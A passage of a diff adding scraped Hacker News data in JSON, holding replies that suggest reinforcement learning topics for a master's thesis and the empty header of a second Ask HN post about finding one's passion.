+          "id": "b06c582b5e0ea48584061da22f769cba",
+          "source_id": "zecice",
+          "username": "zecice",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "f20261b5cee48071ac83a94a0dffa713",
+        "source_id": "49058685",
+        "content": {
+          "text": "My advice, as somebody who has a master’s degree, is to pick a topic that you are really interested in, and that captures your imagination. You will have to dedicate yourself to this work for a considerable amount of time. Doing a CV-driven master thesis will be miserable and more likely to fail. It should be something that is fun and captivating. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.331294",
+        "updated_at": "2026-07-28T17:17:54.331294",
+        "author": {
+          "id": "a9ea0f86665b9c599f7a5142dcb98638",
+          "source_id": "Hendrikto",
+          "username": "Hendrikto",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "913d49bfa8f68a9812df4933836d7b4c",
+        "source_id": "49059806",
+        "content": {
+          "text": "Intrinsic motivation/curiosity driven exploration/novelty seeking feels like it has a breakthrough paper waiting. If someone could get those methods working for LLMs, we start getting things like move37 but in math proofs and then everything else reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.331827",
+        "updated_at": "2026-07-28T17:17:54.331827",
+        "author": {
+          "id": "b8f154998d3244b3d1e16fbd46fc6452",
+          "source_id": "itkovian_",
+          "username": "itkovian_",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "8de53785ef87644b9df0bad751d91b6e",
+        "source_id": "49067607",
+        "content": {
+          "text": "World Models, really big world models like Dreamer V4, which unfortunately you can't do easily as a master student, but maybe you can work with tiny versions and prove that the direction works, or Lora some foundation model. If you look at ARC 3, it is clear that the reasoning capabilities of language models need to be combined with 'reflexes' of classic reinforcement learning. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.332393",
+        "updated_at": "2026-07-28T17:17:54.332393",
+        "author": {
+          "id": "471149f19ab9ffe360e68fe957ab6bb5",
+          "source_id": "singularity2001",
+          "username": "singularity2001",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "8cb9f60e8a12dafb74347991915733b1",
+        "source_id": "49058704",
+        "content": {
+          "text": "Depends on the structure of your Msc, the funding, the compute available, etc, you need to give those details if you want a detailed answer. If you choose something at the limits of the compute available to you, then you make things 10x as difficult. The easy answer that applies everywhere is, choose a topic that has a good volume of phds, postdocs, or professors at the college you're joining. The deep knowledge that arises from this no matter which subfield in RL it is in will later help you transition to your desired subfield much better than a surface-level effort directly in your desired subfield. The most _likely_ answer is sim2real. It has just the right mix of generative AI (funding), robotics usecases (there is an easy \"end\" for your thesis to hook onto as the \"impact\"), and lots of unexplored paths (you won't be chasing a common frontier competing with hundred others). But like I said this depends on the previous two points. Of course there's what you're passionate about and so on, but at the end of the day objectively deep knowledge matters more than passion, unless you're so deep into something, but then your choice is made and you wouldn't have asked this question, so prioritise deep knowledge. Try to actively reduce breadth, IMO the purpose of a research-oriented program is to learn to study depth-wise to the end. As for RL in BCI, as far as I know, we still use established \"RL 101\" algorithms directly applied to the brain signals. Any research deep enough (but short-term enough for a MSc) here will be less RL theory/algorithms and more about the details of this specific application. If that's what you want, go for it. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.333020",
+        "updated_at": "2026-07-28T17:17:54.333020",
+        "author": {
+          "id": "7ff9b387d786bdfdda0909ee391e65c1",
+          "source_id": "porridgeraisin",
+          "username": "porridgeraisin",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "e1362d46506c2f3d9aca3efd192b830b",
+        "source_id": "49060117",
+        "content": {
+          "text": "appreciate the answer! reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.333650",
+        "updated_at": "2026-07-28T17:17:54.333650",
+        "author": {
+          "id": "b06c582b5e0ea48584061da22f769cba",
+          "source_id": "zecice",
+          "username": "zecice",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "b5f79e9015655987ba29a4e624c47eff",
+        "source_id": "49058474",
+        "content": {
+          "text": "RL for closed-loop adaptive BCIs and sim-to-real robotics still look like the strongest practical directions right now. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.334367",
+        "updated_at": "2026-07-28T17:17:54.334367",
+        "author": {
+          "id": "b771fb8742a68d4094de841cd3d32650",
+          "source_id": "murzynalbinos",
+          "username": "murzynalbinos",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "9f7663e8775bc64bdc5052662bdad271",
+        "source_id": "49064529",
+        "content": {
+          "text": "RLVR: https://github.com/opendilab/awesome-RLVR reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.335059",
+        "updated_at": "2026-07-28T17:17:54.335059",
+        "author": {
+          "id": "18b19a179cf46dcd29eb508683eac47f",
+          "source_id": "vismit2000",
+          "username": "vismit2000",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "5f28e391a2f1bc6eee10852ec58c8660",
+        "source_id": "49058683",
+        "content": {
+          "text": "things that are hard to verify. ai didnt takeover the world like it was supposed to because its only good at verifiable stuff like coding but vast majority of economy isnt verifiable. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.335777",
+        "updated_at": "2026-07-28T17:17:54.335777",
+        "author": {
+          "id": "6fd86c97f61e6a058ad39c1289696e83",
+          "source_id": "dominotw",
+          "username": "dominotw",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "bef9d09ba5284e341ab959ab6cff722b",
+        "source_id": "49059396",
+        "content": {
+          "text": "I would probably follow whatever Farama is doing, https://farama.org/projects especially any of the (MO) multi-objective stuff ... reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.336526",
+        "updated_at": "2026-07-28T17:17:54.336526",
+        "author": {
+          "id": "d91df25718688ee6381b75c78aab48f9",
+          "source_id": "jonbaer",
+          "username": "jonbaer",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      },
+      {
+        "id": "536aac2e7051881b55938577ea17215f",
+        "source_id": "49058841",
+        "content": {
+          "text": "On Policy Self Distillation and Active Learning. Anything that increases sample efficiency by providing a richer more dense feedback signal and is more efficient at exploration / sampling. reply",
+          "format": "text",
+          "media": []
+        },
+        "created_at": "2026-07-28T17:17:54.337295",
+        "updated_at": "2026-07-28T17:17:54.337295",
+        "author": {
+          "id": "05443dd72ac4fb3cf041a97f1c911d84",
+          "source_id": "m_ke",
+          "username": "m_ke",
+          "avatar": "",
+          "role": "user"
+        },
+        "parent_id": "",
+        "quote_id": "",
+        "stats": {
+          "likes": 0,
+          "dislikes": 0
+        },
+        "quoted_users": []
+      }
+    ],
+    "metadata": {
+      "crawled_at": "2026-07-28T17:17:54.337740",
+      "language": "en-US",
+      "keywords": [
+        "tech",
+        "startup",
+        "programming",
+        "ask",
+        "question"
+      ],
+      "is_nsfw": false
+    }
+  },
+  {
+    "post": {
+      "id": "b1fc3864bd7774a4526514fea1b6f9ff",
+      "source_id": "49062515",
+      "title": "Ask HN: How do you figure out what you're passionate about?",
+      "content": {
+        "text": "",
+        "format": "html",
+        "media": []
+      },
+      "created_at": "2026-07-28T17:17:16.584022",
+      "updated_at": "2026-07-28T17:17:16.584022",
+      "category": {
+        "id": "f31af88693e43c7e98a65941d54a8cd6",
+        "name": "Ask HN"
+      },
+      "tags": [
+        "Ask HN",
+        "hacker news",
+        "tech"
+      ],
+      "author": {
+        "id": "3afd2d7b107d039c4367587cb581817d",
+        "source_id": "charliebwrites",
+        "username": "charliebwrites",
+        "avatar": "",
+        "role": "user",
+        "signature": ""
+      },
+      "stats": {
+        "views": 0,
+        "likes": 12,
+        "dislikes": 0,
+        "replies": 0,
+        "shares": 0
+      }
+    },
+    "source": {
+      "forum": "hackernews",
+      "url": "https://news.ycombinator.com/item?id=49062515",
+      "section": "Ask HN"
+    },
+    "replies": [],
+    "metadata": {
+      "crawled_at": "2026-07-28T17:17:58.287508",
+      "language": "en-US",
+      "keywords": [
+        "tech",
+        "startup",
+        "programming",
+        "ask",
+        "question"
+      ],
+      "is_nsfw": false
+    }
   }
 ]
